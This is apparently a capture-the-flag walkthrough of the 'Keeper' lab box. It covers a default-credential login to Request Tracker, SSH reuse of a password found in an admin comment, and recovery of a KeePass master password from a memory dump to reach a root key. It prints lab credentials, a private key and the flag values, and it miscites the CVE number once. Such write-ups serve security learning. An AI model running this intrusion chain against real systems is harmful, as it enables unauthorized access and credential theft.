### Summary
We start the box with a webserver redirecting us to an instance of `Request Tracker` that uses the default credentials. With this admin auth, we search through recent tickets to find a user whos default password is in their comments and is unchanged, allowing us `ssh` access. From here, we see an archive in the user's home directory containing a `KeePass` memory dump and database file which we exfiltrate. We utilize `CVE-2023-3278` to dump a wordlist for the master password and crack it, finding a `PuTTY` `ssh` key for `root` which we convert to `OpenSSH`, giving us a shell

### Tools
- `ffuf`
- `keepass2john`
- `hashcat`
- `kpcli`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#HTTP - TCP 80]]
	- [[#Subdomain Bruteforce]]
###### [[#User Shell - lnorgaard]]
- [[#Request Tracker]]
- [[#Enumeration as lnorgaard]]
###### [[#Root Shell]]
- [[#KeePass Memory Dump]]
	- [[#PuTTY -> OpenSSH]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv $IP -oN nmap/tcp
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,80 -sCV -vv $IP -oN nmap/tcpScripts
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHZRUyrg9VQfKeHHT6CZwCwu9YkJosNSLvDmPM9EC0iMgHj7URNWV3LjJ00gWvduIq7MfXOxzbfPAqvm2ahzTc=
|   256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe5w35/5klFq1zo5vISwwbYSVy1Zzy+K9ZCt0px+goO
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn\'t have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- TTL corresponds to a posix adherent system
- OpenSSH and nginx versions line up with Ubuntu `22.04`

## HTTP - TCP 80
---
- Navigating to the site gives us a blank webpage with a hyperlink to raise an IT support ticket
- The hyperlink redirects us to `tickets.keeper.htb`

### Subdomain Bruteforce
```sh
❯ ffuf -u "http://10.129.229.41" -H "Host: FUZZ.keeper.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -ac
...
tickets        [Status: 200, Size: 4236, Words: 407, Lines: 154, Duration: 836ms]
```
- We can add `tickets.keeper.htb` to our `/etc/hosts` file

- `tickets.keeper.htb` brings us to a `bestpractical Request Tracker` login page 
- Supplying the fields with `'` doesn't change the response indicating SQL injection isn't overtly present
- The [github repo](https://github.com/bestpractical/rt) for the service indicates that the default creds are `root:password` which allow us to log in

# User Shell - lnorgaard
## Request Tracker
---
- Now that we have auth, we can navigate around the menus to search through stored tickets
- Searchsploit also has an entry for request tracker, an SQL injection in the `Approvals` subdirectory via `POST` request. We probe it with `sqlmap` to see if we get anything but it's a dead end

- Navigating to tickets, there's one under the `recently viewed` option that shows an issue with Keepass Client on Windows from the user `lnorgaard`
- It's something regarding the client crashing. The email logs say that a dump is attached but there's no simple way to fetch it if at all possible
- Since we're administrators, we can enter the edit menu for `lnorgaard` to find a comment, `New user. Initial password set to Welcome2023!`
- We can test if the creds work for `ssh` via `nxc`:
```sh
❯ nxc ssh $IP -u lnorgaard -p 'Welcome2023!'
SSH         10.129.229.41   22     10.129.229.41    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3
SSH         10.129.229.41   22     10.129.229.41    [+] lnorgaard:Welcome2023!  Linux - Shell access!
```

## Enumeration as lnorgaard
---
- We can immediately grab `user.txt`
```sh
lnorgaard@keeper:~$ cat user.txt 
257df170970dc5b142baa58d6c45ff67
```

- In the home directory, there's also an archive, `RT30000.zip`
```sh
lnorgaard@keeper:~$ unzip -l RT30000.zip 
Archive:  RT30000.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
253395188  2023-05-24 12:51   KeePassDumpFull.dmp
     3630  2023-05-24 12:51   passcodes.kdbx
---------                     -------
253398818                     2 files
```

# Root Shell
## KeePass Memory Dump
---
- A quick google search of `Keepass memory dump` brings us to this [keepass dump extractor github repo](https://github.com/JorianWoltjer/keepass-dump-extractor) 
- The repo advertises that it can find and collect parts of a `Keepass` master key to recover it in plaintext from a memory dump via [CVE-2023-3278](https://nvd.nist.gov/vuln/detail/CVE-2023-32784)
	- KeePass 2.X uses a custom-developed text box for password entry, `SecureTextBoxEx`. 
	- This text box is not only used for the master password entry, but in other places in `KeePass` as well, like password edit boxes (so the attack can also be used to recover their contents).
	- The flaw exploited here is that for every character typed, a leftover string is created in memory. 
	- Because of how `.NET` works, it is nearly impossible to get rid of it once it gets created. For example, when "Password" is typed, it will result in these leftover strings: •a, ••s, •••s, ••••w, •••••o, ••••••r, •••••••d. The POC application searches the dump for these patterns and offers a likely password character for each position in the password.

- We can download the binary from the link github repo and follow its instructions for common usage
	- It'll search through the dump for a wordlist, then we'll pass it to `john` the ripper to create a hash for the keepass db, and we'll finally pass the wordlist and hash to `hashcat` to crack the db
```sh
❯ ./keepass-dump-extractor KeePassDumpFull.dmp -f all > wordlist.txt
❯ keepass2john passcodes.kdbx > passwords.kdbx.hash
❯ hashcat -m 13400 --username passwords.kdbx.hash wordlist.txt
...
$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc:rødgrød med fløde
```
- Nice! Looks like the `KeePass` master password is `rødgrød med fløde`

- We can use the `KeePass CLI` (`kpcli`) package to interact with the `KeePass` database
	- I had to put the password into a text file for the authentication to work
```sh
❯ kpcli --kdb=passcodes.kdbx --pwfile=pw.txt
kpcli:/> ls
=== Groups ===
passcodes/

kpcli:/> cd passcodes/

kpcli:/passcodes> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/

kpcli:/passcodes> ls Network/
=== Entries ===
0. keeper.htb (Ticketing Server)
1. Ticketing System

kpcli:/passcodes> ls Recycle\ Bin/
=== Entries ===
2. Sample Entry                                               keepass.info
3. Sample Entry #2                          keepass.info/help/kb/testform.

kpcli:/passcodes> cd Network/

kpcli:/passcodes/Network> show -f 1

Title: Ticketing System
Uname: lnorgaard
 Pass: Welcome2023!
  URL: 
Notes: http://tickets.keeper.htb

kpcli:/passcodes/Network> show -f 0

Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4><3K0nd!
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

```
- Looks like we've found the creds for `lnorgaard` along with the `root` user's `PuTTY` `ssh` key

### PuTTY -> OpenSSH
- First we'll save off everything after `Notes: ` in the `PuTTY` key entry for `KeePass` into a file
- Then, we'll use the `puttygen` `bash` tool to convert it to a `openssh-private` `ssh` key
```sh
❯ puttygen putty.key -O private-openssh -o openssh.key 

❯ ssh -i openssh.key root@10.129.229.41
...
root@keeper:~# cat ~/root.txt
0bac58e0501b1fa9f991959e59f6e953
```

